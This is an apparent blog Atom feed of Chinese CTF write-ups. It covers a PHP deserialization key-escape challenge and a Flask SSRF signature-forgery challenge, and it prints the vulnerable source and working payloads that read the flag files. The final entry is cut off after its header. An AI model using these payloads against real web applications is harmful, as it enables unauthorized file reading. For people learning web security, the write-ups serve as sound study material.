<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>青花瓷</title>
  
  <subtitle>The value of life lies not length of days, but in the use of we make of them.</subtitle>
  <link href="http://daweitech.github.io/atom.xml" rel="self"/>
  
  <link href="http://daweitech.github.io/"/>
  <updated>2021-08-24T12:21:58.416Z</updated>
  <id>http://daweitech.github.io/</id>
  
  <author>
    <name>宛若梦醒月明时</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安洵杯 2019 easy_serialize_php</title>
    <link href="http://daweitech.github.io/2021/08/19/buu/14/"/>
    <id>http://daweitech.github.io/2021/08/19/buu/14/</id>
    <published>2021-08-19T01:39:03.000Z</published>
    <updated>2021-08-24T12:21:58.416Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12261610.html">安洵杯 2019]easy_serialize_php - 王叹之 - 博客园 (cnblogs.com)</a></p><p>[<a href="https://www.cnblogs.com/h3zh1/p/12732336.html">安洵杯 2019]easy_serialize_php - h3zh1 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.runoob.com/php/php-var_dump-function.html">https://www.runoob.com/php/php-var_dump-function.html</a></p><p><a href="https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp</a></p><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p><img src="/2021/08/19/buu/14/image-20210819094121329.png"></p><p>发现了参数f</p><p>代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function &#x3D; @$_GET[&#39;f&#39;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);</span><br><span class="line">  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;</span><br><span class="line">  return preg_replace($filter,&#39;&#39;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">  unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;</span><br><span class="line">$_SESSION[&#39;function&#39;] &#x3D; $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#39;img_path&#39;])&#123;</span><br><span class="line">  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;</span><br><span class="line">  highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;</span><br><span class="line">  $userinfo &#x3D; unserialize($serialize_info);</span><br><span class="line">  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正式审计前，我注意到了题目一个很大的提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br></pre></td></tr></table></figure><p>顺着提示，赋值f=phpinfo进行查询。</p><p><img src="/2021/08/19/buu/14/image-20210819094711265.png"></p><p>找到了d0g3_f1ag.php，猜测flag在其中</p><p>接下来代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure><p>filter函数是为了过滤用的</p><p>过滤了很多关键字，比如php，flag，若遇到会正则替换为空</p><p>之后还会序列化，所以我们要反序列化操作一手</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br></pre></td></tr></table></figure><p>我萌发现unset函数将$_SESSION销毁了</p><p>然后重新赋予$_SESSION了新的值。</p><p>最后调用了extract($_POST);</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract() 函数从数组中将变量导入到当前的符号表。</span><br></pre></td></tr></table></figure><h5 id="举例extract-变量覆盖"><a href="#举例extract-变量覆盖" class="headerlink" title="举例extract()变量覆盖"></a>举例extract()变量覆盖</h5><p>根据extract()我们可以进行变量覆盖，</p><p>当我们传入SESSION[flag]=123时，$SESSION[“user”]和$SESSION[‘function’] 全部会消失。</p><p>只剩下_SESSION[flag]=123。</p><p><img src="/2021/08/19/buu/14/1947190-20200419170914367-953947353.png" alt="img"></p><h6 id="键值逃逸"><a href="#键值逃逸" class="headerlink" title="键值逃逸"></a>键值逃逸</h6><p>原理:因为序列化后的字符串是严格的，对应的格式不能错，比如s:4:”name”,那s:4就必须有一个字符串长度是4的否则就往后截取</p><p>并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#正规序列化的字符串</span></span><br><span class="line">$a = <span class="string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;&quot;</span>;</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line"><span class="comment">#带有多余的字符的字符串</span></span><br><span class="line">$a_laji = <span class="string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;;s:3:\&quot;真的垃圾img\&quot;;lajilaji&quot;</span>;</span><br><span class="line">var_dump(unserialize($a_laji));</span><br></pre></td></tr></table></figure><p>有了这个逃逸概念的话，就大概可以理解了。</p><p>如果我们把$_SESSION[‘img’] = base64_encode(‘guest_img.png’);这段代码的img属性放到花括号外边去</p><p>然后花括号中注好新的img属性，那么他本来要求的img属性就被咱们替换了。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]&#x3D;;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]&#x3D;;s:14:&quot;phpflagphpflag&quot;;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/19/buu/14/image-20210819210654326.png" alt="image-20210819210654326"></p><p><img src="/2021/08/19/buu/14/image-20210819210523566.png" alt="image-20210819210523566"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h4&gt;&lt;p&gt;[&lt;a href=&quot;https://www.cnblogs.com/wangtanzhi/p/122</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF 2019 SSRF Me</title>
    <link href="http://daweitech.github.io/2021/08/18/buu/13/"/>
    <id>http://daweitech.github.io/2021/08/18/buu/13/</id>
    <published>2021-08-18T12:01:04.000Z</published>
    <updated>2021-08-24T12:23:17.655Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机开启</p><p><img src="/2021/08/18/buu/13/image-20210818200351121.png" alt="image-20210818200351121"></p><p>明显的python代码段，复制下来并进行整理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><span class="comment">#是一个简单的赋值函数</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):<span class="comment">#如果没有该文件夹，则创立一个文件夹</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)   <span class="comment">#注意w，可以对result.txt文件进行修改</span></span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)<span class="comment">#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span></span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)<span class="comment">#打开方式为只读</span></span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()<span class="comment">#读取result.txt中的数据</span></span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="meta">        @app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])#注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))<span class="comment">#cookie传递action参数，对应不同的处理方式</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))<span class="comment">#传递get方式的参数param</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))<span class="comment">#cookie传递sign参数sign</span></span><br><span class="line">    ip = request.remote_addr<span class="comment">#获取请求端的ip地址</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):<span class="comment">#调用waf函数进行过滤</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip) <span class="comment">#创建Task类对象</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())<span class="comment">#以json的形式返回到客户端</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]<span class="comment">#这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span><span class="comment">#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span><span class="comment">#将传入的字符串进行md5加密</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span><span class="comment">#防火墙的作用是判断开头的几个字母是否是gopher 或者是file  如果是的话，返回true</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">9999</span>)</span><br></pre></td></tr></table></figure><p>代码审计：</p><h5 id="1-flask框架"><a href="#1-flask框架" class="headerlink" title="1.flask框架"></a>1.flask框架</h5><h5 id="2-De1ta和-geneSign"><a href="#2-De1ta和-geneSign" class="headerlink" title="2./De1ta和/geneSign"></a>2./De1ta和/geneSign</h5><h5 id="3-task类"><a href="#3-task类" class="headerlink" title="3.task类"></a>3.task类</h5><p>得到flag的大致思路有了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先绕过self.checkSign()，并且传入的action需要同时包含scan和read，然后if &quot;scan&quot; in self.action:执行将flag.txt中的数据写入result.txt中，继续if &quot;read&quot; in self.action:执行读取result.txt中的数据，并且放在 result[&#39;data&#39;] 中 ， return json.dumps(task.Exec())   接着返回以json的形式返回到客户端。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">def getSign(action, param):#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>需要满足函数</p><p>self.checkSign()</p><p>则需满足</p><p><strong>getSign(self.action, self.param) == self.sign，（而sign值通过cookie传值</strong>）</p><p>也就需要</p><p><strong>hashlib.md5(secert_key + param + action).hexdigest() == self.sign</strong></p><p>=&gt;<strong>hashlib.md5(secert_key + ‘flag.txt’ + ‘readscan’).hexdigest() == self.sign</strong></p><p>我们需要得到**secert_key + ‘flag.txtreadscan’**的哈希值</p><p>我们还不懂secret_key的值是多少，它只存在于服务端，但是我们可以通过上面截取的源码中/geneSign，来返回我们所需要的编码之后的哈希值</p><p>注意到/geneSign中已经将action定为scan，所以我们传入的param可以为flag.txtread，这样的话还是会拼接为secert_key + ‘flag.txtreadscan’</p><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;geneSign?param&#x3D;flag.txtread</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/buu/13/image-20210818205021931.png" alt="image-20210818205021931"></p><p>得到哈希值后，将flag.txt中的数据读入result.txt，然后读取result.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">              tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)   <span class="comment">#注意w，可以对result.txt文件进行修改</span></span><br><span class="line">              resp = scan(self.param)</span><br><span class="line">              <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                  result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                  <span class="keyword">print</span> resp</span><br><span class="line">                  tmpfile.write(resp)<span class="comment">#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span></span><br><span class="line">                  tmpfile.close()</span><br><span class="line">              result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">          <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">              f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)<span class="comment">#打开方式为只读</span></span><br><span class="line">              result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">              result[<span class="string">&#x27;data&#x27;</span>] = f.read()<span class="comment">#读取result.txt中的数据</span></span><br><span class="line">          <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">              result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br></pre></td></tr></table></figure><h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h5><p>伪造cookie的值</p><p><img src="/2021/08/18/buu/13/image-20210818205732109.png" alt="image-20210818205732109"></p><h5 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h5><p><a href="https://blog.csdn.net/RABCDXB/article/details/115412359">https://blog.csdn.net/RABCDXB/article/details/115412359</a></p><p><a href="https://www.cnblogs.com/zzjdbk/p/13685940.html">https://www.cnblogs.com/zzjdbk/p/13685940.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h4 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h4&gt;&lt;h4 id=&quot;0x01解题&quot;&gt;&lt;a href=&quot;#0x01解题&quot; class=</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>0CTF 2016 piapiapia</title>
    <link href="http://daweitech.github.io/2021/08/17/buu/12/"/>
    <id>http://daweitech.github.io/2021/08/17/buu/12/</id>
    <published>2021-08-17T12:05:50.000Z</published>
    <updated>2021-08-24T12:25:44.275Z</updated>
    
